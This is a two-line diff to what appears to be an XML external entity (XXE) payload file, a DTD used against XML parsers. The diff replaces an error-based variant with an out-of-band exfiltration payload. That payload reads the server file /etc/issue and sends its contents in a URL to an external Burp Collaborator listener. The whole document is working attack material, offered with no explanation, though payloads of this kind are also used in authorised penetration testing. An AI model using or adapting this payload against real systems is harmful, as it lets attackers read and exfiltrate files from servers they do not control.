@@ -1,1 +1,2 @@
-<!ENTITY % param1 '<!ENTITY &#x25; external SYSTEM "file:///nothere/%payload;">'> %param1; %external;
+<!ENTITY % data SYSTEM "file:///etc/issue">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://jwjb41dvpkkx121lt1yahxy0orunic.burpcollaborator.net/?%data;'>">
